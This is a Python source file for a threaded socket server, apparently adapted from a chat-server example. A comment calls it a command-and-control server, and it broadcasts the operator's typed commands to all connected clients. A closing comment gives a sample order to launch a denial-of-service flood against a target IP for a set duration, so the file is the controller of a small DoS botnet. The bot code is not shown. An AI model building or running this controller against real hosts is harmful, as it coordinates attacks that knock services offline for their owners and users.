from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread
import netifaces as ni

def accept_incoming_connections():
    while True:
        client, client_address = SERVER.accept()
        print("%s:%s has connected." % client_address)
        client.send(bytes("Greetings from the cave! Now type your name and press enter!", "utf8"))
        addresses[client] = client_address
        Thread(target=handle_client, args=(client,)).start()


def handle_client(client):  # Takes client socket as argument.
    name = client.recv(BUFSIZ).decode("utf8")
    welcome = 'Welcome %s! If you ever want to quit, type {quit} to exit.' % name
    client.send(bytes(welcome, "utf8"))
    print(f"{addresses[client]} has joined the chat") 
    clients[client] = name

    while True:
        msg = client.recv(BUFSIZ)
        if msg != bytes("{quit}", "utf8"):
            msg = msg.decode("utf8")
            print(msg)
        else:
            client.close()
            del clients[client]
            print(f"{addresses[client]} has left the chat.")
            break


def broadcast(msg, prefix=""):  # prefix is for name identification.
    """Broadcasts a message to all the clients."""

    for sock in clients:
        sock.send(bytes(prefix, "utf8")+msg)

def send():
    while True:
        msg = input()
        broadcast(bytes(msg, "utf8"))
        if msg == "{quit}":
            break
        
clients = {}
addresses = {}

# C&C's IP address
HOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
PORT = 33000
BUFSIZ = 1024
ADDR = (HOST, PORT)

SERVER = socket(AF_INET, SOCK_STREAM)
SERVER.bind(ADDR)

if __name__ == "__main__":
    SERVER.listen(5)
    print("Waiting for connection...")
    ACCEPT_THREAD = Thread(target=accept_incoming_connections)
    SEND_THREAD = Thread(target=send)
    ACCEPT_THREAD.start()
    SEND_THREAD.start()
    ACCEPT_THREAD.join()
    SEND_THREAD.join()
    SERVER.close()

    # command=dos, target_ip=10.0.2.7, source_port=1026, max_duration=50